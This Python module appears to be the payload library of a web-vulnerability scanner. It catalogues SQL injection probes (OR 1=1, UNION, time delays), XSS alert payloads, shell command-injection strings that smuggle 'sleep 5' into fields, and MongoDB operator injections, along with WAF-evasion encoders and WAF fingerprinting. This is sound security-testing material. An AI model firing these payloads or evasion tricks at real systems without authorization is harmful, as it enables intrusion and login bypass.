#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PIN0CCHI0 Payload Library

Provides standardized payload sets and tamper utilities that modules can use for
adaptive testing. Payloads are keyed (stable IDs) so their outcomes can be
tracked in persistent memory (payload_stats table) via AgentContext.

API surface:
- get_contexts() -> List[str]
- get_payload_catalog(context: str) -> List[dict]
  Each payload dict: {key, value, tags, meta}
- get_payload_by_key(key: str) -> Optional[dict]
- generate_payloads(context: str, hints: Optional[dict] = None, limit: int = 50) -> List[dict]
  Applies minimal ordering based on hints (e.g., dbms, waf), caller can re-rank using memory stats.
- tamper utilities: encode_url, encode_double_url, html_encode, case_randomize, comment_style, whitespace_pad
- waf_fingerprint(status, headers, body_snippet) -> Optional[str]

Notes:
- Keep payloads compact and safe for test harnesses. Time-based and intrusive
  payloads must honor module-level budgets.
- For SQLi, we provide variants for common DBMS (mysql, pgsql, mssql, oracle)
  and comment styles ('--', '#', '/* */').
"""

from __future__ import annotations

import random
import urllib.parse
from typing import Dict, List, Optional

# --- Core payload sets ------------------------------------------------------

_SQLI: List[Dict] = [
    # Boolean-based
    {
        'key': 'sqli:boolean:or1eq1:sq',
        'value': "' OR 1=1 -- ",
        'tags': ['sqli', 'boolean', 'generic'],
        'meta': {'comment': '--', 'dbms': 'generic'}
    },
    {
        'key': 'sqli:boolean:or1eq1:dq',
        'value': '" OR 1=1 -- ',
        'tags': ['sqli', 'boolean', 'generic'],
        'meta': {'comment': '--', 'dbms': 'generic'}
    },
    {
        'key': 'sqli:boolean:or1eq1:hash',
        'value': "' OR 1=1 #",
        'tags': ['sqli', 'boolean', 'generic'],
        'meta': {'comment': '#', 'dbms': 'generic'}
    },
    # Union-based (minimal column probing; modules should expand)
    {
        'key': 'sqli:union:null1',
        'value': "' UNION SELECT NULL -- ",
        'tags': ['sqli', 'union', 'generic'],
        'meta': {'comment': '--', 'dbms': 'generic'}
    },
    # Error-based hints (MySQL)
    {
        'key': 'sqli:error:mysql:extractvalue',
        'value': "' AND EXTRACTVALUE(1, CONCAT(':', (SELECT 1))) -- ",
        'tags': ['sqli', 'error', 'mysql'],
        'meta': {'comment': '--', 'dbms': 'mysql'}
    },
    # Time-based (MySQL, Postgres, MSSQL)
    {
        'key': 'sqli:time:mysql:sleep',
        'value': "' AND SLEEP(5) -- ",
        'tags': ['sqli', 'time', 'mysql'],
        'meta': {'comment': '--', 'dbms': 'mysql', 'delay_s': 5}
    },
    {
        'key': 'sqli:time:pgsql:pg_sleep',
        'value': "' AND pg_sleep(5) -- ",
        'tags': ['sqli', 'time', 'pgsql'],
        'meta': {'comment': '--', 'dbms': 'pgsql', 'delay_s': 5}
    },
    {
        'key': 'sqli:time:mssql:waitfor',
        'value': "' ; WAITFOR DELAY '0:0:5' -- ",
        'tags': ['sqli', 'time', 'mssql'],
        'meta': {'comment': '--', 'dbms': 'mssql', 'delay_s': 5}
    },
]

_XSS: List[Dict] = [
    {
        'key': 'xss:reflected:script',
        'value': '<script>alert(1)</script>',
        'tags': ['xss', 'reflected'],
        'meta': {'context': 'html'}
    },
    {
        'key': 'xss:reflected:breakout',
        'value': '"><script>alert(1)</script>',
        'tags': ['xss', 'reflected', 'attr-breakout'],
        'meta': {'context': 'attr'}
    },
    {
        'key': 'xss:attr:onerror',
        'value': '<img src=x onerror=alert(1)>',
        'tags': ['xss', 'reflected', 'attr'],
        'meta': {'context': 'html'}
    },
    {
        'key': 'xss:svg:onload',
        'value': '<svg/onload=alert(1)>',
        'tags': ['xss', 'svg'],
        'meta': {'context': 'svg'}
    },
]

_CMDI: List[Dict] = [
    {
        'key': 'cmdi:sleep:semi',
        'value': '; sleep 5',
        'tags': ['cmdi', 'time'],
        'meta': {'shell': 'sh', 'delay_s': 5}
    },
    {
        'key': 'cmdi:sleep:and',
        'value': ' && sleep 5',
        'tags': ['cmdi', 'time'],
        'meta': {'shell': 'sh', 'delay_s': 5}
    },
    {
        'key': 'cmdi:sleep:pipe',
        'value': ' | sleep 5',
        'tags': ['cmdi', 'time'],
        'meta': {'shell': 'sh', 'delay_s': 5}
    },
    {
        'key': 'cmdi:sleep:subshell',
        'value': ' $(sleep 5) ',
        'tags': ['cmdi', 'time'],
        'meta': {'shell': 'sh', 'delay_s': 5}
    },
]

_NOSQL: List[Dict] = [
    {
        'key': 'nosqli:mongodb:or_true',
        'value': '{"$or":[{}, {"a":{"$ne":null}}]}',
        'tags': ['nosqli', 'mongodb', 'boolean'],
        'meta': {'type': 'json'}
    },
    {
        'key': 'nosqli:mongodb:gt',
        'value': '{"$gt":""}',
        'tags': ['nosqli', 'mongodb', 'operator'],
        'meta': {'type': 'json'}
    },
]

_CATALOG: Dict[str, List[Dict]] = {
    'sqli': _SQLI,
    'xss': _XSS,
    'cmdi': _CMDI,
    'nosqli': _NOSQL,
}

# Index by key for quick lookup
_INDEX_BY_KEY: Dict[str, Dict] = {p['key']: p for ctx in _CATALOG.values() for p in ctx}

# --- Tamper / encoders ------------------------------------------------------

def encode_url(s: str) -> str:
    return urllib.parse.quote_plus(s, safe='')

def encode_double_url(s: str) -> str:
    return encode_url(encode_url(s))

def html_encode(s: str) -> str:
    return (s
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&#x27;'))

def case_randomize(s: str) -> str:
    out = []
    for ch in s:
        if ch.isalpha():
            out.append(ch.upper() if random.random() < 0.5 else ch.lower())
        else:
            out.append(ch)
    return ''.join(out)

def comment_style(s: str, style: str = '--') -> str:
    # Ensure a space before comment start to end SQL token cleanly
    if style == '--':
        return s.rstrip() + ' -- '
    if style == '#':
        return s.rstrip() + ' #'
    if style == '/* */':
        return s.rstrip() + ' /* */'
    return s

def whitespace_pad(s: str, left: int = 0, right: int = 1) -> str:
    return (' ' * left) + s + (' ' * right)

# --- WAF fingerprinting helpers --------------------------------------------

def waf_fingerprint(status: int, headers: Dict[str, str], body_snippet: str) -> Optional[str]:
    h = {k.lower(): v for k, v in (headers or {}).items()}
    text = (body_snippet or '').lower()
    # Status-based
    if status in (403, 406):
        # Vendor hints
        if 'cf-ray' in h or 'cf-cache-status' in h:
            return 'cloudflare:403'
        if 'x-sucuri-id' in h or 'x-sucuri-block' in h:
            return 'sucuri:403'
        if 'x-akamai' in '\n'.join([f"{k}:{v}" for k, v in h.items()]):
            return 'akamai:403'
        return f"unknown:{status}"
    # Body-based patterns
    if 'mod_security' in text or 'modsecurity' in text:
        return 'modsec:blocked'
    if 'access denied' in text and 'firewall' in text:
        return 'generic-waf:denied'
    return None

# --- Public API -------------------------------------------------------------

def get_contexts() -> List[str]:
    return list(_CATALOG.keys())

def get_payload_catalog(context: str) -> List[Dict]:
    return list(_CATALOG.get(context, []))

def get_payload_by_key(key: str) -> Optional[Dict]:
    return _INDEX_BY_KEY.get(key)

def generate_payloads(context: str, hints: Optional[Dict] = None, limit: int = 50) -> List[Dict]:
    """
    Return payload dicts (deep-copied) with optional light reordering based on hints:
    - hints.dbms: 'mysql'|'pgsql'|'mssql'|'oracle'|'generic'
    - hints.encoding: 'url'|'doubleurl'|'html'
    - hints.random_case: bool
    - hints.comment: '--'|'#'|'/* */'
    """
    import copy
    feats = _CATALOG.get(context, [])
    if not feats:
        return []

    dbms = (hints or {}).get('dbms')
    encoding = (hints or {}).get('encoding')
    comment = (hints or {}).get('comment')
    random_case = (hints or {}).get('random_case', False)

    # Simple ranking: prioritize dbms-matching payloads first
    ranked: List[Dict] = []
    rest: List[Dict] = []
    for p in feats:
        (ranked if (dbms and p['meta'].get('dbms') == dbms) else rest).append(copy.deepcopy(p))
    ordered = ranked + rest

    # Apply simple transforms as variants when requested
    out: List[Dict] = []
    for p in ordered:
        val = p['value']
        if context == 'sqli' and comment:
            val = comment_style(val, comment)
        if encoding == 'url':
            val = encode_url(val)
        elif encoding == 'doubleurl':
            val = encode_double_url(val)
        elif encoding == 'html':
            val = html_encode(val)
        if random_case:
            val = case_randomize(val)
        p['value'] = val
        out.append(p)
        if len(out) >= limit:
            break

    return out[:limit]
